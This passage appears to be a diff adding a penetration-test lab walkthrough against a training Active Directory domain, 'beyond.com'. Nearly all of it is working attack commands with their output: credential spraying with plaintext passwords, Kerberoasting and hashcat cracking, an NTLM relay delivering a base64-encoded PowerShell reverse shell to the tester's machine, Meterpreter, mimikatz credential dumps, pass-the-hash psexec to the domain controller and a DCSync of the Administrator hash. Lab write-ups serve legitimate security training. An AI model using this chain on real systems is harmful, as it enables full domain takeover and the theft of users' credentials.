+SMB         172.16.148.241  445    INTERNALSRV1     [*] Windows Server 2022 Build 20348 x64 (name:INTERNALSRV1) (domain:beyond.com) (signing:False) (SMBv1:False)
+SMB         172.16.148.240  445    DCSRV1           [+] beyond.com\john:dqsTwTpZPn#nL 
+SMB         172.16.148.254  445    MAILSRV1         [+] beyond.com\john:dqsTwTpZPn#nL 
+SMB         172.16.148.254  445    MAILSRV1         [+] Enumerated shares
+SMB         172.16.148.254  445    MAILSRV1         Share           Permissions     Remark
+SMB         172.16.148.254  445    MAILSRV1         -----           -----------     ------
+SMB         172.16.148.254  445    MAILSRV1         ADMIN$                          Remote Admin
+SMB         172.16.148.254  445    MAILSRV1         C$                              Default share
+SMB         172.16.148.254  445    MAILSRV1         IPC$            READ            Remote IPC
+SMB         172.16.148.241  445    INTERNALSRV1     [-] Connection Error: The NETBIOS connection with the remote host timed out.
+SMB         172.16.148.240  445    DCSRV1           [-] Error enumerating shares: The NETBIOS connection with the remote host timed out.
+
+Same to other users we have their credntials.
+
+Next we did was to perform ports and service enumeration
+
+┌──(kali㉿kali)-[~]
+└─$ sudo proxychains -q nmap -sT -oN nmap_servers -Pn -p 21,80,443 172.16.148.240 172.16.148.241 172.16.148.254
+Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-11-02 13:28 CET
+Nmap scan report for 172.16.148.240
+Host is up (2.2s latency).
+
+PORT    STATE  SERVICE
+21/tcp  closed ftp
+80/tcp  closed http
+443/tcp closed https
+
+Nmap scan report for 172.16.148.241
+Host is up (0.15s latency).
+
+PORT    STATE  SERVICE
+21/tcp  closed ftp
+80/tcp  open   http
+443/tcp open   https
+
+Nmap scan report for 172.16.148.254
+Host is up (0.10s latency).
+
+PORT    STATE  SERVICE
+21/tcp  closed ftp
+80/tcp  open   http
+443/tcp closed https
+
+Nmap done: 3 IP addresses (3 hosts up) scanned in 13.61 seconds
+
+Let's concentrate on the Windows Server 2022 Standard internalsrv1.beyond.com        172.16.148.241
+
+To connect to the web application on port 80, we use chisel. # The configuration is on the  training manual
+
+After configuring it with chisel, we can access the web application on the port 80 of our local host. However, to have the full functionality, we must add it to the /etc/hosts of our Kali. 127.0.0.1 internalsrv1.beyond.com
+From their we hac access http://127.0.0.1/wordpress/wp-admin
+We tried different password that we got earlier, but none worked. Therefore, the only way is to keberoast the internalsrv1.beyond.com to find any user that has a session in it and is vulnerable to kerberoasting.
+
+To initiate the kebroasting, we use the domain user John's credentials
+┌──(kali㉿kali)-[~]
+└─$ proxychains -q impacket-GetUserSPNs -request -dc-ip 172.16.148.240 beyond.com/john
+Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 
+
+Password:
+ServicePrincipalName          Name     MemberOf  PasswordLastSet             LastLogon                   Delegation 
+----------------------------  -------  --------  --------------------------  --------------------------  ----------
+http/internalsrv1.beyond.com  daniela            2022-09-29 10:17:20.062328  2022-10-05 09:59:48.376728             
+
+
+
+[-] CCache file is not found. Skipping...
+$krb5tgs$23$*daniela$BEYOND.COM$beyond.com/daniela*$57d90d91a079935ecb207f7ba79a295e$c28b72eb93dcc1510225201481f6839c585fdd02dc8a7ccb6a4af9e9c2142ad9942d6681497503fd316d77e4995468395ff2062204d955807717c11e92a8e8b318f0a4fb38ff6b919db517e6ddf7f1ad092d73c0717b36162fb2b708579fa5ce39e41604de820e73caaebf370ebe8c6cb74bc40bff0c81849d6394d78ce5188a065b70b0cc649c1d6f06f4c31839659a412dfc4db8ed2ed7dbeea62f54ec83e3b4cdc272751506063505c3703c0c7824c1028814462a4ca8575b135df1b55be8f33ae2283554f0272d494c48261739abf67b85984c00d7a10e2dc6a40602a0a110b22ead884c32dda13569e1d7471733a77d23f7ad3f26da1abc9130fc667aff44a0f368bd5c7549f1c41a4788857f3cdf6bcf9900f784d44a3aa6f9a534dc00cc67b050a54812f64e0da29448a1ed30d0a370b6c26b5c2228c337a7533de417b6e8ee5aef68cdfc68a5b355ccef9714e1109b9287487cccf31b2be45edf123ea28eeba27d8b8ee8644e94baff230f0f83593ae41373cc99460a38fc9900772b792d1c80f083e27c39c8d9b43d0ad7ae142ede498ca6ffd3794568d1ce4e6fd464ef13f91252352d1e5239ee5064c60a1bf73fa535c91732514da6a0da060a25df83d534821084554ab44136219b1e1455cc9af7ef3f5c2f0c20a692e4fc89327228e51877f6e434a2a018d37982816313b86807bda246f5c96ee91fc13426516af16098041d5c5db084e3643b61c4fab9c20646b8d999f2345bbee24c2b3471026f17e26d1195c017033f95b2add4b74d0497824dc7e87795b7d3b33010f718c858e489ffc5eda5165a7884180e9f9ce7a4d70b8e92486a45ebd2815a6bbf9ddd0b7b3c8d05f958604ec72426d5bb0312f78485b8998c5a15b54a341e3d296744a61fbee4e4b9bc45db611231a5a3326f4f5f7655a53d930d24678c5d40abc51d26186dfab5c64184fc26111075bf73b604bb42eff5434504a4cbb1abd96b6f0236522b0b110d44af62dd4a3def4da6f11ee3c2e42cdca49c046dc373ec5d450d86a8c9470ea626e7a895b0d14f70860c4de72059a03ebdc2f8e3a3ee133ff4e06ad0b8097f962718b88c4e1271a7656627670b28b8754310b8d6d1c0b7240e3db21707ab517b7fe3d45f30486631a0b08a223af1300de38e6860c9ddd568404d5e82c5a18d019fee67c78ee1c446f5b48b8dc58004782dc8c5841742145abc57f7c1d07f0fc5189cf8bbb4c0ea513e2bc6910e1c09803a437fc1a2d49582a13c1f20e603447579e83afa803531aec0276e1de36b6894e353a3bab4e9de9904415b3f3c6ab5b8752ba0c444192dc9119ffc06dba50857732ef1644cf5abad
+
+
+We found the user Daniela's keberoas credentials, we cracked it with hashcat
+                                                                                                                                             
+┌──(kali㉿kali)-[~]
+└─$ sudo hashcat -m 13100 daniela.hash /usr/share/wordlists/rockyou.txt --force
+The result is DANIelaRO123
+with the username and the password, we had access to the admin of the web application. We went enumerated the wodpress plugins and noticed that only one was activated which is backup migration plugin that is used to back up the application to a specified directory in xampp. We assumed that the backup is usin an admin privilege accpunt, and earlier, we also noticed that the beccy admin has a session in the mail server computer. therefor we can use the backup account and authenticate into the mailserver via a relay attack using impacket-ntlmrelayx. If beccy's password used in the backup directory is same with the one she is using in the mailserver, we can get a session in the mailserver as beccky, the use a reverse shell to get the shell in our Kali.
+
+To achieve this, we changed a the backup director to an unknown folder in our kali //<kali_ip/test 
+
+We tried to initiate a relay authentication attack to the mailserver and  adding it a reverse shell oneliner at port 4443
+
+┌──(kali㉿kali)-[~]
+└─$ pwsh                                                                              
+PowerShell 7.2.6
+Copyright (c) Microsoft Corporation.
+
+https://aka.ms/powershell
+Type 'help' to get help.
+
+
+┌──(kali㉿kali)-[/home/kali]
+└─PS> $Text = '$client = New-Object System.Net.Sockets.TCPClient("kali_ip",4443);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()'                                                     
+
+┌──(kali㉿kali)-[/home/kali]
+└─PS> $Bytes = [System.Text.Encoding]::Unicode.GetBytes($Text)                                                                                 
+
+┌──(kali㉿kali)-[/home/kali]
+└─PS> $EncodedText =[Convert]::ToBase64String($Bytes)                                                                                          
+
+┌──(kali㉿kali)-[/home/kali]
+└─PS> $EncodedText                                                                                                                             
+JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIAMQA5ADIALgAxADYAOAAuADQANQAuADEANQAyACIALAA0ADQANAAzACkAOwAkAHMAdAByAGUAYQBtACAAPQAgACQAYwBsAGkAZQBuAHQALgBHAGUAdABTAHQAcgBlAGEAbQAoACkAOwBbAGIAeQB0AGUAWwBdAF0AJABiAHkAdABlAHMAIAA9ACAAMAAuAC4ANgA1ADUAMwA1AHwAJQB7ADAAfQA7AHcAaABpAGwAZQAoACgAJABpACAAPQAgACQAcwB0AHIAZQBhAG0ALgBSAGUAYQBkACgAJABiAHkAdABlAHMALAAgADAALAAgACQAYgB5AHQAZQBzAC4ATABlAG4AZwB0AGgAKQApACAALQBuAGUAIAAwACkAewA7ACQAZABhAHQAYQAgAD0AIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIAAtAFQAeQBwAGUATgBhAG0AZQAgAFMAeQBzAHQAZQBtAC4AVABlAHgAdAAuAEEAUwBDAEkASQBFAG4AYwBvAGQAaQBuAGcAKQAuAEcAZQB0AFMAdAByAGkAbgBnACgAJABiAHkAdABlAHMALAAwACwAIAAkAGkAKQA7ACQAcwBlAG4AZABiAGEAYwBrACAAPQAgACgAaQBlAHgAIAAkAGQAYQB0AGEAIAAyAD4AJgAxACAAfAAgAE8AdQB0AC0AUwB0AHIAaQBuAGcAIAApADsAJABzAGUAbgBkAGIAYQBjAGsAMgAgAD0AIAAkAHMAZQBuAGQAYgBhAGMAawAgACsAIAAiAFAAUwAgACIAIAArACAAKABwAHcAZAApAC4AUABhAHQAaAAgACsAIAAiAD4AIAAiADsAJABzAGUAbgBkAGIAeQB0AGUAIAA9ACAAKABbAHQAZQB4AHQALgBlAG4AYwBvAGQAaQBuAGcAXQA6ADoAQQBTAEMASQBJACkALgBHAGUAdABCAHkAdABlAHMAKAAkAHMAZQBuAGQAYgBhAGMAawAyACkAOwAkAHMAdAByAGUAYQBtAC4AVwByAGkAdABlACgAJABzAGUAbgBkAGIAeQB0AGUALAAwACwAJABzAGUAbgBkAGIAeQB0AGUALgBMAGUAbgBnAHQAaAApADsAJABzAHQAcgBlAGEAbQAuAEYAbAB1AHMAaAAoACkAfQA7ACQAYwBsAGkAZQBuAHQALgBDAGwAbwBzAGUAKAApAA==
+
+┌──(kali㉿kali)-[/home/kali]
+└─PS> exit             
+                            
+──(kali㉿kali)-[~]
+└─$ sudo impacket-ntlmrelayx --no-http-server -smb2support -t mailser_external_server_ip -c "powershell -enc JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIAMQA5ADIALgAxADYAOAAuADQANQAuADEANQAyACIALAA0ADQANAAzACkAOwAkAHMAdAByAGUAYQBtACAAPQAgACQAYwBsAGkAZQBuAHQALgBHAGUAdABTAHQAcgBlAGEAbQAoACkAOwBbAGIAeQB0AGUAWwBdAF0AJABiAHkAdABlAHMAIAA9ACAAMAAuAC4ANgA1ADUAMwA1AHwAJQB7ADAAfQA7AHcAaABpAGwAZQAoACgAJABpACAAPQAgACQAcwB0AHIAZQBhAG0ALgBSAGUAYQBkACgAJABiAHkAdABlAHMALAAgADAALAAgACQAYgB5AHQAZQBzAC4ATABlAG4AZwB0AGgAKQApACAALQBuAGUAIAAwACkAewA7ACQAZABhAHQAYQAgAD0AIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIAAtAFQAeQBwAGUATgBhAG0AZQAgAFMAeQBzAHQAZQBtAC4AVABlAHgAdAAuAEEAUwBDAEkASQBFAG4AYwBvAGQAaQBuAGcAKQAuAEcAZQB0AFMAdAByAGkAbgBnACgAJABiAHkAdABlAHMALAAwACwAIAAkAGkAKQA7ACQAcwBlAG4AZABiAGEAYwBrACAAPQAgACgAaQBlAHgAIAAkAGQAYQB0AGEAIAAyAD4AJgAxACAAfAAgAE8AdQB0AC0AUwB0AHIAaQBuAGcAIAApADsAJABzAGUAbgBkAGIAYQBjAGsAMgAgAD0AIAAkAHMAZQBuAGQAYgBhAGMAawAgACsAIAAiAFAAUwAgACIAIAArACAAKABwAHcAZAApAC4AUABhAHQAaAAgACsAIAAiAD4AIAAiADsAJABzAGUAbgBkAGIAeQB0AGUAIAA9ACAAKABbAHQAZQB4AHQALgBlAG4AYwBvAGQAaQBuAGcAXQA6ADoAQQBTAEMASQBJACkALgBHAGUAdABCAHkAdABlAHMAKAAkAHMAZQBuAGQAYgBhAGMAawAyACkAOwAkAHMAdAByAGUAYQBtAC4AVwByAGkAdABlACgAJABzAGUAbgBkAGIAeQB0AGUALAAwACwAJABzAGUAbgBkAGIAeQB0AGUALgBMAGUAbgBnAHQAaAApADsAJABzAHQAcgBlAGEAbQAuAEYAbAB1AHMAaAAoACkAfQA7ACQAYwBsAGkAZQBuAHQALgBDAGwAbwBzAGUAKAApAA=="
+[sudo] password for kali: 
+Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 
+
+[*] Protocol Client RPC loaded..
+[*] Protocol Client HTTPS loaded..
+[*] Protocol Client HTTP loaded..
+[*] Protocol Client DCSYNC loaded..
+[*] Protocol Client SMB loaded..
+[*] Protocol Client MSSQL loaded..
+[*] Protocol Client IMAP loaded..
+[*] Protocol Client IMAPS loaded..
+[*] Protocol Client LDAPS loaded..
+[*] Protocol Client LDAP loaded..
+[*] Protocol Client SMTP loaded..
+[*] Running in relay mode to single host
+[*] Setting up SMB Server on port 445
+[*] Setting up WCF Server on port 9389
+[*] Setting up RAW Server on port 6666
+[*] Multirelay disabled
+
+[*] Servers started, waiting for connections
+[*] SMBD-Thread-4 (process_request_thread): Received connection from 192.168.192.242, attacking target smb://192.168.192.242
+[*] Authenticating against smb://192.168.192.242 as INTERNALSRV1/ADMINISTRATOR SUCCEED
+[*] All targets processed!
+[*] SMBD-Thread-6 (process_request_thread): Connection from 192.168.192.242 controlled, but there are no more targets left!
+[*] All targets processed!
+[*] SMBD-Thread-7 (process_request_thread): Connection from 192.168.192.242 controlled, but there are no more targets left!
+[*] All targets processed!
+[*] SMBD-Thread-8 (process_request_thread): Connection from 192.168.192.242 controlled, but there are no more targets left!
+[*] All targets processed!
+
+ 
+We started a netcat listener on port 4443 on our kali, then save the new backup folder we added in the WordPress. If the authentication gets successfull, we will get a revershell as beccy in Windows Server 2022 Standard MAILSRV1.beyond.com 172.16.148.254
+
+We transferred the met.exe file and executed it on the console, we got another session on our Metasploit console.
+[*] Sending stage (201798 bytes) to 192.168.192.242
+[*] Meterpreter session 2 opened (192.168.45.152:443 -> 192.168.192.242:57100) at 2024-11-02 15:59:33 +0100 
+
+We can upload mimikatz to get the beccy's ntlm hash
+
+mimikatz # privilege::debug
+Privilege '20' OK
+
+mimikatz # sekurlsa::logonpasswords
+
+Authentication Id : 0 ; 333396 (00000000:00051654)
+Session           : Interactive from 1
+User Name         : beccy
+Domain            : BEYOND
+Logon Server      : DCSRV1
+Logon Time        : 10/28/2024 12:40:38 AM
+SID               : S-1-5-21-1104084343-2915547075-2081307249-1108
+        msv :
+         [00000003] Primary
+         * Username : beccy
+         * Domain   : BEYOND
+         * NTLM     : f0397ec5af49971f6efbdb07877046b3
+         * SHA1     : 2d878614fb421517452fd99a3e2c52dee443c8cc
+         * DPAPI    : 4aea2aa4fa4955d5093d5f14aa007c56
+        tspkg :
+        wdigest :
+         * Username : beccy
+         * Domain   : BEYOND
+         * Password : (null)
+        kerberos :
+         * Username : beccy
+         * Domain   : BEYOND.COM
+         * Password : NiftyTopekaDevolve6655!#!
+        ssp :
+        credman :
+        cloudap :
+
+We use beccy's ntlm hash to authenticate into the domain controller via smb
+
+┌──(kali㉿kali)-[~]
+└─$ proxychains -q impacket-psexec -hashes 00000000000000000000000000000000:f0397ec5af49971f6efbdb07877046b3 beccy@172.16.148.240
+Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 
+
+[*] Requesting shares on 172.16.148.240.....
+[*] Found writable share ADMIN$
+[*] Uploading file TNCjvGFU.exe
+[*] Opening SVCManager on 172.16.148.240.....
+w[*] Creating service khsl on 172.16.148.240.....
+h[*] Starting service khsl.....
+oam[!] Press help for extra shell commands
+Microsoft Windows [Version 10.0.20348.1006]
+(c) Microsoft Corporation. All rights reserved.
+
+C:\Windows\system32> whoami
+'whoamwhoami' is not recognized as an internal or external command,
+operable program or batch file.
+
+C:\Windows\system32> whoami
+nt authority\system
+
+
+we also uploaded mimikatz to dump the administrators hash as our flag
+
+PS C:\Users\Administrator> iwr -uri http://192.168.45.152:8000/mimikatz.exe -Outfile mimikatz.exe
+
+PS C:\Users\Administrator> .\mimikatz.exe
+
+  .#####.   mimikatz 2.2.0 (x64) #19041 Sep 19 2022 17:44:08
+ .## ^ ##.  "A La Vie, A L'Amour" - (oe.eo)
+ ## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )
+ ## \ / ##       > https://blog.gentilkiwi.com/mimikatz
+ '## v ##'       Vincent LE TOUX             ( vincent.letoux@gmail.com )
+  '#####'        > https://pingcastle.com / https://mysmartlogon.com ***/
+
+
+mimikatz # 
+privilege::debug
+mimikatz # Privilege '20' OK
+
+
+mimikatz # 
+Lsadump::dcsync /domain:beyond.com /user:administrator
+mimikatz # [DC] 'beyond.com' will be the domain
+[DC] 'DCSRV1.beyond.com' will be the DC server
+[DC] 'administrator' will be the user account
+[rpc] Service  : ldap
+[rpc] AuthnSvc : GSS_NEGOTIATE (9)
+
+Object RDN           : Administrator
+
+** SAM ACCOUNT **
+
+SAM Username         : Administrator
+Account Type         : 30000000 ( USER_OBJECT )
+User Account Control : 00010200 ( NORMAL_ACCOUNT DONT_EXPIRE_PASSWD )
+Account expiration   : 
+Password last change : 10/13/2022 6:18:37 AM
+Object Security ID   : S-1-5-21-1104084343-2915547075-2081307249-500
+Object Relative ID   : 500
+
+Credentials:
+  Hash NTLM: 8480fa6ca85394df498139fe5ca02b95
+    ntlm- 0: 8480fa6ca85394df498139fe5ca02b95
+    ntlm- 1: a07fc8cbdda7f2d4515a6aab11da28c7
+    lm  - 0: ba6a26fc17bd17723b09004a956c8590
